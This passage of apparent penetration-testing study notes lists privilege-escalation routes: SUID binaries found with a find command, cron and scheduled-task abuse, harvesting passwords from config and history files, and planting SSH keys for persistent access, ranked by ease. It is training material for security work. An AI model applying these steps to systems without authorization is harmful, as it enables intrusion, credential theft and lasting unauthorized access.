2. **SUID/SGID Binaries:**
   - Find with `find / -perm -4000`
   - Exploit custom/vulnerable binaries
   - Standard binaries usually patched
   - Look for command injection flaws

3. **Scheduled Tasks (Linux/Windows):**
   - Linux: Cron jobs in /etc/cron.d/, /etc/crontab
   - Windows: Scheduled tasks via Task Scheduler
   - Two exploitation methods: Create new or modify existing
   - Wait for scheduled time to execute

4. **Exposed Credentials:**
   - Check config files for hardcoded passwords
   - Check history files for reused passwords
   - Try password reuse across accounts
   - Often leads to direct root access

5. **SSH Keys:**
   - Reading private keys = SSH access
   - Create key pair on attacker machine
   - Install public key in authorized_keys
   - Persistent access without passwords
   - Must use chmod 600 for permissions

6. **Strategic Priority:**
   - Sudo → Fastest if NOPASSWD
   - Credentials → Easiest if found
   - SSH Keys → Most persistent
   - Cron → Reliable but requires waiting
   - SUID → Depends on availability

---

## Notes